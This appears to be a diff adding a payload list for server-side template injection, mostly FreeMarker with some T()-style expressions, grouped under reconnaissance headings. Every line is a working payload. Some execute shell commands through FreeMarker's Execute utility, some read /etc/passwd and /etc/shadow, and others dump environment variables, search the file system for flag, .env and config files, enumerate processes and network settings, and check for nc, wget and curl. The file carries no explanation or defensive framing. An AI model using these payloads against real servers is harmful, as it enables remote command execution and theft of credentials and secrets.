@@ -1,0 +1,85 @@
+# System Information
+${.version}
+${T(java.lang.System).getProperty('os.name')}
+${T(java.lang.System).getProperty('os.version')}
+${T(java.lang.System).getProperty('os.arch')}
+${T(java.lang.System).getProperty('user.name')}
+${T(java.lang.System).getProperty('user.home')}
+${T(java.lang.System).getProperty('user.dir')}
+${T(java.lang.System).getProperty('java.version')}
+${T(java.lang.System).getProperty('java.home')}
+${T(java.lang.System).getProperty('java.class.path')}
+${T(java.lang.System).getProperty('java.vendor')}
+${T(java.lang.System).getProperty('java.vm.version')}
+<#assign keys = T(java.lang.System).getProperties().keys()>
+<#list keys as key>
+${key}=${T(java.lang.System).getProperty(key)}
+</#list>
+
+# Environment Variables
+${T(java.lang.System).getenv()}
+${T(java.lang.System).getenv('PATH')}
+${T(java.lang.System).getenv('HOME')}
+${T(java.lang.System).getenv('USER')}
+<#assign env = T(java.lang.System).getenv()>
+<#list env?keys as key>
+${key}=${env[key]}
+</#list>
+
+# File System Enumeration
+${T(java.lang.ProcessBuilder).start(['ls','-la','/']).inputStream.readAllBytes()?join(" ")}
+${"freemarker.template.utility.Execute"?new()("ls -la /")}
+${"freemarker.template.utility.Execute"?new()("ls -la /home")}
+${"freemarker.template.utility.Execute"?new()("ls -la /tmp")}
+${"freemarker.template.utility.Execute"?new()("ls -la /var/www")}
+${"freemarker.template.utility.Execute"?new()("ls -la /etc")}
+${"freemarker.template.utility.Execute"?new()("find / -name '*flag*' 2>/dev/null")}
+${"freemarker.template.utility.Execute"?new()("find / -name '*.conf' 2>/dev/null")}
+${"freemarker.template.utility.Execute"?new()("find / -name '.env' 2>/dev/null")}
+${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
+${"freemarker.template.utility.Execute"?new()("cat /etc/hosts")}
+${"freemarker.template.utility.Execute"?new()("cat /etc/crontab")}
+${"freemarker.template.utility.Execute"?new()("cat /etc/shadow")}
+${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/etc/passwd'))}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}
+
+# File Existence Checks
+${T(java.io.File)('/etc/passwd').exists()?string('yes','no')}
+${T(java.io.File)('/root').isDirectory()?string('yes','no')}
+${T(java.io.File)('/tmp').canWrite()?string('yes','no')}
+
+# Network Information
+${"freemarker.template.utility.Execute"?new()('ifconfig')}
+${"freemarker.template.utility.Execute"?new()('ip addr')}
+${"freemarker.template.utility.Execute"?new()('netstat -tulpn')}
+${"freemarker.template.utility.Execute"?new()('route -n')}
+${"freemarker.template.utility.Execute"?new()('ping -c 1 8.8.8.8')}
+
+# Process Information
+${"freemarker.template.utility.Execute"?new()('ps aux')}
+${"freemarker.template.utility.Execute"?new()('ps -ef')}
+${"freemarker.template.utility.Execute"?new()('top -bn1')}
+${T(java.lang.management.ManagementFactory).getRuntimeMXBean().getName()}
+
+# Database Enumeration
+${T(java.sql.DriverManager).getDrivers()}
+${T(java.lang.Class).forName('com.mysql.jdbc.Driver')?string('MySQL driver exists','not found')}
+${T(java.lang.Class).forName('org.postgresql.Driver')?string('PostgreSQL driver exists','not found')}
+${"freemarker.template.utility.Execute"?new()('find / -name "*.sql" 2>/dev/null')}
+${"freemarker.template.utility.Execute"?new()('find / -name "*.db" 2>/dev/null')}
+
+# Container Detection
+${"freemarker.template.utility.Execute"?new()('cat /proc/1/cgroup | grep docker')}
+${"freemarker.template.utility.Execute"?new()('ls -la /.dockerenv')}
+
+# Java Classpath and Libraries
+${T(java.lang.System).getProperty('java.class.path')}
+${T(java.lang.Class).forName('org.apache.commons.io.IOUtils')?string('Commons IO exists','not found')}
+${T(java.lang.Class).forName('com.fasterxml.jackson.databind.ObjectMapper')?string('Jackson exists','not found')}
+${T(java.lang.Class).forName('org.springframework.web.servlet.DispatcherServlet')?string('Spring MVC exists','not found')}
+${T(java.lang.Class).forName('org.hibernate.Session')?string('Hibernate exists','not found')}
+
+# Package Information
+${"freemarker.template.utility.Execute"?new()('dpkg -l | head -20')}
+${"freemarker.template.utility.Execute"?new()('rpm -qa | head -20')}
+${"freemarker.template.utility.Execute"?new()('which nc wget curl python perl gcc')}
